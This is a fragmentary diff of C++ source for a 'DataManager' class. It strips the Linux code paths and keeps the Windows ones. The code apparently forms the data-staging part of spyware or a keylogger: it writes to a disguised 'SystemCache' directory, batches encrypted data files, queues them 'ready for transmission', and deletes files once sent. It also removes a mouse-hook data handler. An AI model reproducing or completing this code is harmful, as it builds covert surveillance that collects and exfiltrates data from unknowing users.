@@ -10,18 +10,9 @@
 #include <string>
 #include <cstring>
 #include <ctime>
-
-// Platform-specific includes
-#if PLATFORM_WINDOWS
 #include <windows.h>
 #include <fileapi.h>
 #include <sys/stat.h>
-#else
-#include <dirent.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <unistd.h>
-#endif
 
 // Forward declaration for Configuration if not available
 class Configuration {
@@ -40,18 +31,10 @@ DataManager::~DataManager() {
 }
 
 void DataManager::InitializeStorage() {
-#if PLATFORM_WINDOWS
     m_storagePath = "C:\\Temp\\SystemCache\\";
-#else
-    m_storagePath = "/tmp/.SystemCache/";
-#endif
     
     // Create directory if it doesn't exist
-#if PLATFORM_WINDOWS
     CreateDirectoryA(m_storagePath.c_str(), NULL);
-#else
-    mkdir(m_storagePath.c_str(), 0700);
-#endif
     
     // Create initial data file
     auto now = std::chrono::system_clock::now();
@@ -119,7 +102,7 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     std::vector<uint8_t> allData;
     
     for (const auto& file : dataFiles) {
-        // Read file data (simplified implementation)
+        // Read file data
         if (FILE* f = fopen(file.c_str(), "rb")) {
             fseek(f, 0, SEEK_END);
             long size = ftell(f);
@@ -181,7 +164,6 @@ void DataManager::ClearData() {
     
     // Delete all transmitted files
     std::vector<std::string> allFiles;
-#if PLATFORM_WINDOWS
     WIN32_FIND_DATAA findData;
     HANDLE hFind = FindFirstFileA((m_storagePath + "*.transmitted").c_str(), &findData);
     if (hFind != INVALID_HANDLE_VALUE) {
@@ -192,25 +174,9 @@ void DataManager::ClearData() {
         } while (FindNextFileA(hFind, &findData));
         FindClose(hFind);
     }
-#else
-    if (DIR* dir = opendir(m_storagePath.c_str())) {
-        struct dirent* entry;
-        while ((entry = readdir(dir)) != nullptr) {
-            std::string filename = entry->d_name;
-            if (filename.find(".transmitted") != std::string::npos) {
-                allFiles.push_back(m_storagePath + filename);
-            }
-        }
-        closedir(dir);
-    }
-#endif
     
     for (const auto& file : allFiles) {
-#if PLATFORM_WINDOWS
         DeleteFileA(file.c_str());
-#else
-        unlink(file.c_str());
-#endif
     }
 }
 
@@ -307,11 +273,10 @@ void DataManager::RotateDataFile() {
     LOG_DEBUG("Rotated data file to: " + m_currentDataFile);
 }
 
-std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
+std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() const {
     std::vector<std::string> files;
     
     // List all .bin files
-#if PLATFORM_WINDOWS
     WIN32_FIND_DATAA findData;
     HANDLE hFind = FindFirstFileA((m_storagePath + "*.bin").c_str(), &findData);
     if (hFind != INVALID_HANDLE_VALUE) {
@@ -323,18 +288,6 @@ std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
         } while (FindNextFileA(hFind, &findData));
         FindClose(hFind);
     }
-#else
-    if (DIR* dir = opendir(m_storagePath.c_str())) {
-        struct dirent* entry;
-        while ((entry = readdir(dir)) != nullptr) {
-            std::string filename = entry->d_name;
-            if (filename.find(".bin") != std::string::npos) {
-                files.push_back(m_storagePath + filename);
-            }
-        }
-        closedir(dir);
-    }
-#endif
     
     // Filter files
     std::vector<std::string> filteredFiles;
@@ -342,7 +295,7 @@ std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
         if (file != m_currentDataFile && 
             file.find(".transmitted") == std::string::npos) {
             
-            // Check file modification time (simplified)
+            // Check file modification time
             struct stat fileInfo{};
             if (stat(file.c_str(), &fileInfo) == 0) {
                 auto currentTime = std::chrono::system_clock::now();
@@ -460,9 +413,6 @@ std::vector<uint8_t> DataManager::GetBatchData() {
     std::vector<uint8_t> encryptedData(batchData.begin(), batchData.end());
     
     return encryptedData;
-}
-
-void DataManager::AddMouseData(const MouseHookData &mouse_data) {
 }
 
 std::string DataManager::GenerateBatchId() {
